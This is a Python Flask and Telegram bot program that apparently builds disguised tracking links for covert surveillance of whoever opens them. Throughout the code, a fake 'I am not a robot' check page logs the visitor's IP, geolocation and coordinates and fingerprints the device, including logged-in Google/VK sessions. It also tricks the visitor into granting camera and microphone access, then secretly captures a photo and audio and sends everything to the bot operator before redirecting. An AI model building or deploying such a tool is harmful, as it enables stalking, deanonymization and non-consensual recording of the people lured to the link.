import telebot, requests, os, uuid
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

db = {} 

@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
        <h1 style="margin-bottom:20px;">🛡️ CVERIA SYSTEM V4</h1>
        <a href="/activate" style="padding:15px 35px;background:#0088cc;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;box-shadow:0 0 25px #0088cc;">АКТИВИРОВАТЬ</a>
    </body>
    '''

@app.route('/activate')
def activate():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "✅ SYSTEM ARMED"
    return "❌ ERROR"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return "!", 200
    return "error", 403

@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "EXPIRED", 404
    owner_id = db[uid]['owner']
    target = db[uid]['url']
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('user-agent')
    
    g = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g = (f"🌍 {r['country']}, {r['city']} ({r['regionName']})\n"
                 f"📡 {r['isp']}\n🛡️ VPN: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}\n"
                 f"📍 Координаты: `{r['lat']}, {r['lon']}`")
    except: pass
    
    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n👤 IP: `{ip}`\n{g}\n📱 UA: `{ua}`", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;text-align:center;">
        <div>
            <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <p style="color:#888;margin-bottom:25px;">Нажмите "Я НЕ РОБОТ"</p>
            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        btn.onclick = async () => {{
            btn.innerText = "Синхронизация...";
            let d = {{
                uid: "{uid}",
                hw: {{ 
                    scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, 
                    cores: navigator.hardwareConcurrency, 
                    ram: navigator.deviceMemory || "N/A",
                    gpu: "N/A",
                    touch: navigator.maxTouchPoints
                }},
                net: {{ 
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone, 
                    type: navigator.connection ? navigator.connection.effectiveType : "N/A", 
                    hist: history.length,
                    lang: navigator.language
                }},
                bat: {{ lvl: "N/A", char: "N/A" }},
                state: {{ inc: false, dark: window.matchMedia('(prefers-color-scheme: dark)').matches, mot: "static" }},
                social: {{ g: false, vk: false }}
            }};

            try {{
                let gl = document.createElement('canvas').getContext('webgl');
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                d.hw.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }} catch(e) {{}}

            if (navigator.storage && navigator.storage.estimate) {{
                const est = await navigator.storage.estimate();
                if (est.quota < 120000000) d.state.inc = true;
            }}

            try {{
                let b = await navigator.getBattery();
                d.bat.lvl = Math.round(b.level * 100) + "%";
                d.bat.char = b.charging ? "Заряжается" : "Нет";
            }} catch(e) {{}}

            const check = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r(true); i.onerror=()=>r(false); i.src=u; }});
            d.social.g = await check("https://accounts.google.com");
            d.social.vk = await check("https://vk.com");

            window.ondevicemotion = e => {{ if(e.acceleration.x > 0.1) d.state.mot = "moving"; }};

            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                
                const rec = new MediaRecorder(s);
                const chunks = [];
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = () => {{
                    const f = new FormData(); f.append('audio', new Blob(chunks, {{type:'audio/ogg'}}), 'a.ogg'); f.append('uid', "{uid}");
                    fetch('/log_audio', {{ method: 'POST', body: f }});
                }};
                rec.start();
                setTimeout(() => rec.stop(), 4000);

                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, 'p.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "{target}";
                        }});
                    }}, 'image/jpeg', 0.7);
                }}, 1200);
            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = (f"🖥 *ТЕХНИЧЕСКИЙ ОТЧЕТ ID:* `{d['uid']}`\n\n"
             f"🔋 *Заряд:* `{d['bat']['lvl']}` (`{d['bat']['char']}`)\n"
             f"🌐 *Сеть:* `{d['net']['type']}` | *Вкладки:* `{d['net']['hist']}`\n"
             f"🧠 *CPU:* `{d['hw']['cores']} ядер` | *RAM:* `{d['hw']['ram']}GB`\n"
             f"📺 *Экран:* `{d['hw']['scr']}`\n"
             f"🎮 *GPU:* `{d['hw']['gpu']}`\n"
             f"👤 *Вход:* `Google: {'✅' if d['social']['g'] else '❌'}` | `VK: {'✅' if d['social']['vk'] else '❌'}`\n"
             f"🌓 *Тема:* `{'Темная' if d['state']['dark'] else 'Светлая'}`\n"
             f"🕵️ *Инкогнито:* `{'ДА' if d['state']['inc'] else 'НЕТ'}`\n"
             f"🏃 *Движение:* `{d['state']['mot']}`\n"
             f"🕒 *Пояс:* `{d['net']['tz']}` | `{d['net']['lang']}`")
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, f = request.form.get('uid'), request.files.get('photo')
    if uid in db and f:
        bot.send_photo(db[uid]['owner'], f.read(), caption=f"📸 *ФОТО ОБЪЕКТА ID:* `{uid}`", parse_mode="Markdown")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    uid, f = request.form.get('uid'), request.files.get('audio')
    if uid in db and f:
        bot.send_voice(db[uid]['owner'], f.read(), caption=f"🎤 *ЗВУК ОКРУЖЕНИЯ ID:* `{uid}`", parse_mode="Markdown")
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "🤖 *Система сбора данных активна.*\nПришли ссылку на Telegraph.", parse_mode="Markdown")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    bot.reply_to(m, f"✅ *Ссылка готова:*\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
